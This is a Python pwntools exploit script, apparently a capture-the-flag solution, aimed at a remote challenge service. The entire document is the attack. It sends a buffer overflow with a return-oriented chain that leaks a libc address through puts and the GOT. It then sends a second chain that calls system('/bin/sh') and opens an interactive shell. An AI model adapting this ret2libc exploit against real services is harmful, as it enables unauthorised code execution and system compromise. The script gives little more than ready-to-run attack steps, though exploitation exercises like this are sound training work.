from pwn import *


r = remote("overly.uniquename.xyz", 2052)
#r = process("./challenge")
#gdb.attach(r)

r.recvuntil(b'Enter password to disable dispenser:')

puts = 0x4010a0
pop_rdi_ret = 0x0000000000401313
puts_got = 0x000000000404020
main = 0x401293
ret = 0x000000000040101a

padding = b"a"*(0x218)
payload = padding
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts)
payload += p64(main)

r.sendline(payload)


stuff = r.recvuntil(b'\x7f').split(b'...\n')[1][:6]
libc_base = int.from_bytes(stuff, "little") - 0x0000000000875a0
print(hex(libc_base))


binsh = 0x1b75aa + libc_base
system = 0x000000000055410 + libc_base

payload = padding
payload += p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)

r.sendline(payload)

r.interactive()